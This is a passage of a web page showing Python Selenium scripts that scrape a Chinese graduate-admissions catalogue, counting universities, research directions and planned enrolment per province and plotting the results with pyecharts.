class="keyword">def</span> <span class="title">set_height_width</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        width = driver.execute_script(<span class="string">"return document.documentElement.scrollWidth"</span>)</span><br><span class="line">        height = driver.execute_script(<span class="string">"return document.documentElement.scrollHeight"</span>)</span><br><span class="line">        driver.set_window_size(width, height)</span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要翻页就翻页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">paging</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">        li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">        <span class="comment"># print("当前页面翻页元素长度：" + str(len(li)))</span></span><br><span class="line">        <span class="comment"># 第一页右下角的标签数量最大为10，小于10时没有 Go 输入跳转框</span></span><br><span class="line">        <span class="keyword">if</span>(len(li) &lt; <span class="number">10</span>):</span><br><span class="line">            pagenumber = int(li[<span class="number">-2</span>].text)</span><br><span class="line">        <span class="comment"># print(pagenumber)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pagenumber = int(li[<span class="number">-3</span>].text)</span><br><span class="line">        <span class="comment"># print("当前页数：" + str(pagenumber))</span></span><br><span class="line">        <span class="keyword">return</span> pagenumber</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复选框条件选择，通过城市，门类、学科类别来区分</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_option</span><span class="params">(self, driver, count)</span>:</span></span><br><span class="line">        <span class="comment"># https://selenium-python-zh.readthedocs.io/en/latest/api.html</span></span><br><span class="line">        <span class="comment"># 使用 Select 处理下拉框的选项</span></span><br><span class="line">        <span class="comment"># 先通过 Xpath 找到 select 标签，然后通过 value 找到对应值即可选择</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># print("当前正在选择的城市代码为： " + count)</span></span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='ssdm']"</span>)).select_by_value(count)</span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='mldm']"</span>)).select_by_value(self.mldm)</span><br><span class="line">            Select(driver.find_element_by_xpath(<span class="string">"//select[@id='yjxkdm']"</span>)).select_by_value(self.yjxkdm)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 找到查询按钮进行点击</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"//input[@name='button']"</span>).click()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 点击完还是在一个 tab 里， handle 也一样</span></span><br><span class="line">            <span class="comment"># 条件选择完之后开始统计数量</span></span><br><span class="line">            counts = self.count_city(driver)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"选择条件出现错误，请检查门类代码与学科类别代码对应关系是否正确！程序即将退出..."</span>.rjust(<span class="number">50</span>, <span class="string">'*'</span>))</span><br><span class="line">        <span class="comment"># print("当前城市的学校数量：" + str(counts))</span></span><br><span class="line">        <span class="keyword">return</span> counts</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回当前所选择城市开设目标专业的高校数量</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count_city</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        counts = <span class="number">0</span></span><br><span class="line">        self.FlagOfProcess = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 不用下一页操作</span></span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                counts = len(numbers)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.FlagOfProcess = <span class="literal">False</span></span><br><span class="line">                print(<span class="string">"查找失败，请检查当前页面是否为空！"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (pagenumber &lt; <span class="number">7</span>):</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                counts += len(numbers)</span><br><span class="line">                ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 下一页按钮位置不同,用 Go</span></span><br><span class="line">            flag = <span class="number">2</span>  <span class="comment"># 下一次要Go的页码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                <span class="comment"># 定位页码</span></span><br><span class="line">                counts += len(numbers)</span><br><span class="line">                driver.find_element_by_css_selector(<span class="string">"#goPageNo"</span>).send_keys(str(flag))  <span class="comment"># 输入页码跳转</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='page-btn']"</span>).click()  <span class="comment"># 点击 Go，仍然同是一个 window_handle</span></span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">                flag += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> counts</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回所有城市代码，然后遍历城市，得到高校数量</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_major</span><span class="params">(self, driver)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录所有的城市代码</span></span><br><span class="line">        city_value = []</span><br><span class="line">        <span class="comment"># 记录所有城市名字</span></span><br><span class="line">        city_name = []</span><br><span class="line">        <span class="comment"># 城市的高校数量</span></span><br><span class="line">        school_counts = []</span><br><span class="line">        <span class="keyword">assert</span> len(driver.window_handles) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 选择省市</span></span><br><span class="line">        options = driver.find_element_by_css_selector(<span class="string">"#ssdm"</span>)</span><br><span class="line">        option = options.find_elements_by_xpath(<span class="string">"option"</span>)</span><br><span class="line">        <span class="keyword">for</span> city <span class="keyword">in</span> option[<span class="number">1</span>::]:</span><br><span class="line">            city_name.append(city.get_attribute(<span class="string">"textContent"</span>))</span><br><span class="line">            city_value.append(city.get_attribute(<span class="string">"value"</span>))</span><br><span class="line">        <span class="comment"># print(city_name, city_value)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 遍历城市代码，传入统计高校数量的函数</span></span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> city_value:</span><br><span class="line">            counts = self.select_option(driver, count)</span><br><span class="line">            school_counts.append(counts)</span><br><span class="line">        <span class="comment"># print(school_counts)</span></span><br><span class="line"></span><br><span class="line">        driver.close()</span><br><span class="line">        driver.quit()</span><br><span class="line">        print(<span class="string">"正在准备绘制图表..."</span>)</span><br><span class="line">        <span class="keyword">return</span> city_name, school_counts</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 数据可视化</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visulize</span><span class="params">(self, city_name, school_counts,)</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(self.FlagOfProcess):</span><br><span class="line">            realcity = []</span><br><span class="line">            <span class="comment"># 处理城市名，只保留两字或三字名称</span></span><br><span class="line">            <span class="keyword">for</span> citys <span class="keyword">in</span> city_name:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"黑龙江"</span> <span class="keyword">in</span> citys:</span><br><span class="line">                    a = <span class="string">"黑龙江"</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">"内蒙古"</span> <span class="keyword">in</span> citys:</span><br><span class="line">                    a = <span class="string">"内蒙古"</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    a = citys[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">                realcity.append(a)</span><br><span class="line">            <span class="comment"># print(realcity)</span></span><br><span class="line">            <span class="comment"># 将数据处理成列表</span></span><br><span class="line">            list1 = [[realcity[i], school_counts[i]] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(realcity))]</span><br><span class="line">            <span class="comment"># print(list1)</span></span><br><span class="line"></span><br><span class="line">            map_1 = Map()</span><br><span class="line">            map_1.set_global_opts(</span><br><span class="line">                title_opts=opts.TitleOpts(title=<span class="string">"2020高校分布"</span>),</span><br><span class="line">                visualmap_opts=opts.VisualMapOpts(max_=<span class="number">40</span>)  <span class="comment"># 最大数据范围</span></span><br><span class="line">            )</span><br><span class="line">            map_1.add(<span class="string">"2020高校分布"</span>, list1, maptype=<span class="string">"china"</span>)</span><br><span class="line">            <span class="comment"># map_1.add_js_funcs("window.confirm()")</span></span><br><span class="line">            map_1.render(<span class="string">'SchoolMap.html'</span>)</span><br><span class="line">            print(<span class="string">"绘制成功，请在同级目录下查看 SchoolMap.html 文件！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"出现错误，停止绘制图表！"</span>)</span><br></pre></td></tr></table></figure><p><strong>ResearchDirectionsByPyEcharts.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@author: Brian</span></span><br><span class="line"><span class="string">@file: ResearchDirectionsByPyEcharts.py</span></span><br><span class="line"><span class="string">@time: 2020/6/27 15:38</span></span><br><span class="line"><span class="string">@desc: 对每个城市的高校开设的研究方向进行处理，并打印结果中的985&amp;211院校</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Line</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReserachDirections</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, count, mldm, yjxkdm)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.count = count</span><br><span class="line">        self.mldm = mldm</span><br><span class="line">        self.yjxkdm = yjxkdm</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置 driver</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_driver</span><span class="params">(self)</span>:</span></span><br><span class="line">        chrome_options = Options()</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">        chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line">        driver = webdriver.Chrome(executable_path=<span class="string">"E:/Program Files/chromedriver_win32/chromedriver.exe"</span>,</span><br><span class="line">                                  chrome_options=chrome_options)</span><br><span class="line">        driver.get(self.url)</span><br><span class="line">        driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将设置屏幕大小独立出来，方便每次跳转完使用</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_height_width</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        width = driver.execute_script(<span class="string">"return document.documentElement.scrollWidth"</span>)</span><br><span class="line">        height = driver.execute_script(<span class="string">"return document.documentElement.scrollHeight"</span>)</span><br><span class="line">        driver.set_window_size(width, height)</span><br><span class="line">        <span class="keyword">return</span> driver</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果需要翻页就翻页</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">paging</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">        li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">        <span class="comment"># print("当前页面翻页元素长度：" + str(len(li)))</span></span><br><span class="line">        <span class="comment"># 第一页右下角的标签数量最大为10，小于10时没有 Go 输入跳转框</span></span><br><span class="line">        <span class="keyword">if</span>(len(li) &lt; <span class="number">10</span>):</span><br><span class="line">            pagenumber = int(li[<span class="number">-2</span>].text)</span><br><span class="line">        <span class="comment"># print(pagenumber)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pagenumber = int(li[<span class="number">-3</span>].text)</span><br><span class="line">        print(<span class="string">"当前页数："</span> + str(pagenumber))</span><br><span class="line">        <span class="keyword">return</span> pagenumber</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获得当前条件下的所有高校名称,返回名称列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_school_name</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        name_list = []</span><br><span class="line">        major_numbers_list = []</span><br><span class="line">        number_list = []</span><br><span class="line">        original_window = driver.current_window_handle</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pagenumber == <span class="number">1</span>):</span><br><span class="line">            numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> range(<span class="number">1</span>, len(numbers)+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    school_name = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[1]//form[1]//a[1]"</span>.format(line)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                    print(school_name)</span><br><span class="line">                    name_list.append(school_name)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 跳转到每个学校对应的研究方向信息页面</span></span><br><span class="line">                    driver.find_element_by_link_text(school_name).click()</span><br><span class="line">                    <span class="keyword">for</span> window_handle <span class="keyword">in</span> driver.window_handles:</span><br><span class="line">                        <span class="keyword">if</span> window_handle != original_window:</span><br><span class="line">                            driver.switch_to.window(window_handle)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 得到该学校各个研究方向的列表</span></span><br><span class="line">                    major_list ,number = self.get_major_info(driver)</span><br><span class="line">                    major_numbers_list.append(major_list)</span><br><span class="line">                    number_list.append(number)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 关闭信息页面，转到学校列表页面</span></span><br><span class="line">                    driver.close()</span><br><span class="line">                    driver.switch_to.window(original_window)</span><br><span class="line">                    driver = self.set_height_width(driver)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    flag = <span class="literal">False</span></span><br><span class="line">                    print(<span class="string">"查找失败，请检查当前页面是否为空！"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (pagenumber &lt; <span class="number">7</span>):</span><br><span class="line">            <span class="keyword">while</span> (pagenumber):</span><br><span class="line">                numbers = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> range(<span class="number">1</span>, len(numbers)+<span class="number">1</span>):</span><br><span class="line">                    school_name = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[1]//form[1]//a[1]"</span>.format(line)).get_attribute(<span class="string">"textContent"</span>)</span><br><span class="line">                    name_list.append(school_name)</span><br><span class="line">                    print(school_name)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 跳转到每个学校对应的研究方向信息页面</span></span><br><span class="line">                    driver.find_element_by_link_text(school_name).click()</span><br><span class="line">                    <span class="keyword">for</span> window_handle <span class="keyword">in</span> driver.window_handles:</span><br><span class="line">                        <span class="keyword">if</span> window_handle != original_window:</span><br><span class="line">                            driver.switch_to.window(window_handle)</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 得到该学校各个研究方向的列表</span></span><br><span class="line">                    major_list, number = self.get_major_info(driver)</span><br><span class="line">                    major_numbers_list.append(major_list)</span><br><span class="line">                    number_list.append(number)</span><br><span class="line"></span><br><span class="line">                    <span class="comment"># 关闭信息页面，转到学校列表页面</span></span><br><span class="line">                    driver.close()</span><br><span class="line">                    driver.switch_to.window(original_window)</span><br><span class="line">                    driver = self.set_height_width(driver)</span><br><span class="line"></span><br><span class="line">                ul = driver.find_element_by_xpath(<span class="string">"//ul[@class='ch-page']"</span>)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(name_list)</span></span><br><span class="line">        <span class="keyword">return</span> name_list, major_numbers_list, number_list, flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获得某个院校在目标专业下的研究方向的数量，返回数量列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_major_info</span><span class="params">(self, driver)</span>:</span></span><br><span class="line">        <span class="comment"># 当前 Tab 里有多少个页面</span></span><br><span class="line">        pagenumber = self.paging(driver)</span><br><span class="line">        majors = <span class="number">0</span></span><br><span class="line">        all_number = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 定位跳转</span></span><br><span class="line">        css_selector_jumpto = <span class="string">"body.ch-sticky:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.main-wrapper:nth-child(2) "</span> \</span><br><span class="line">                              <span class="string">"div.container.clearfix:nth-child(5) "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-row.clearfix "</span> \</span><br><span class="line">                              <span class="string">"div.zsml-page-box ul.ch-page "</span></span><br><span class="line">        <span class="keyword">if</span>(pagenumber == <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 不用下一页操作</span></span><br><span class="line">            major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">            print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">            majors += len(major)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(<span class="string">"data-title"</span>)</span><br><span class="line">                    numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                    all_number += int(numbers)</span><br><span class="line">                    print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span>(pagenumber &lt; <span class="number">7</span> ):</span><br><span class="line">            <span class="comment"># 找到下一页按钮</span></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(major) + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            number = driver.find_element_by_xpath(<span class="string">"//tr[&#123;&#125;]//td[7]//a[1]"</span>.format(i)).get_attribute(</span><br><span class="line">                                <span class="string">"data-title"</span>)</span><br><span class="line">                            numbers = re.sub(<span class="string">r"[^0-9]"</span>, <span class="string">""</span>, number)</span><br><span class="line">                            print(<span class="string">"  拟招生："</span> + numbers)</span><br><span class="line">                            all_number += int(numbers)</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            print(e)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        print(e)</span><br><span class="line">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class="line">                li = ul.find_elements_by_xpath(<span class="string">"li"</span>)</span><br><span class="line">                li[<span class="number">-1</span>].click()</span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 下一页按钮位置不同,用 Go</span></span><br><span class="line">            flag = <span class="number">2</span>  <span class="comment"># 下一次要Go的页码</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(pagenumber):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    major = driver.find_elements_by_xpath(<span class="string">"//tbody//tr"</span>)</span><br><span class="line">                    print(<span class="string">"这一页的专业数量"</span> + str(len(major)))</span><br><span class="line">                    majors += len(major)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    print(e)</span><br><span class="line">                driver.find_element_by_css_selector(<span class="string">"#goPageNo"</span>).send_keys(str(flag))  <span class="comment"># 输入页码跳转</span></span><br><span class="line">                driver.find_element_by_xpath(<span class="string">"//input[@class='page-btn']"</span>).click()  <span class="comment"># 点击 Go，仍然同是一个 window_handle</span></span><br><span class="line">                pagenumber -= <span class="number">1</span></span><br><span class="line">                flag +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(len(major_list))</span></span><br><span class="line">        print(<span class="string">"专业数量： "</span> + str(majors))</span><br><span class="line">        print(<span class="string">"  共招生: "</span> + str(all_number))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> majors, all_number</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 复选框条件选择，选择城市、门类、学科类别</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select_option</span><span class="params">(self, driver)</span>:</span></span><br><span class="line"></span><br><span class="line">        school_list = []</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        list_211 = [<span class="string">'清华大学'</span>, <span class="string">'北京大学'</span>, <span class="string">'中国人民大学'</span>, <span class="string">'北京工业大学'</span>, <span 